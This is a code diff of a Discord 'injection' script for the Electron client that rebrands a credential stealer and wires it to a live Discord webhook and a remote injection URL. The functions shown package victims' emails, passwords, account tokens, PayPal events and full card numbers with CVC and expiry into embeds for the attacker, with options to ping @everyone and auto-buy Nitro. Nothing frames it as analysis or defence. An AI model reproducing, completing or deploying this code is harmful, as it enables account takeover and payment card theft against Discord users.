@@ -6,15 +6,18 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%', 
-  webhook_protector_key: '%WEBHOOK_KEY%', 
+  webhook: 'https://discord.com/api/webhooks/1073703313289261186/3fweZmKXw9LVTVEW6Y6oLyxMJV7H6BVpivl-aMhPyvg55mgAyme92mfFWz-2oSB-WYpS', 
+  webhook_protector_key: 'https://discord.com/api/webhooks/1073703313289261186/3fweZmKXw9LVTVEW6Y6oLyxMJV7H6BVpivl-aMhPyvg55mgAyme92mfFWz-2oSB-WYpS', 
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'Katliam', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg?size=4096'.replace(/ /g, '%20'), 
+  embed_name: 'Creal Injection', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1073703290577105048/1085638594590425098/pedro-pascal-1.jpg?size=4096'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Eathemcmd/ahmetkaya/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  /**
+   
+   **/
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
@@ -677,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Katliam',
+          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
         },
       },
     ],
@@ -719,7 +722,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Katliam',
+          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
         },
       },
     ],
@@ -761,7 +764,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Katliam',
+          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
         },
       },
     ],
@@ -803,7 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Katliam',
+          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
         },
       },
     ],
@@ -845,7 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Katliam',
+          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
         },
       },
     ],
@@ -889,7 +892,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Katliam',
+          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
         },
       },
     ],
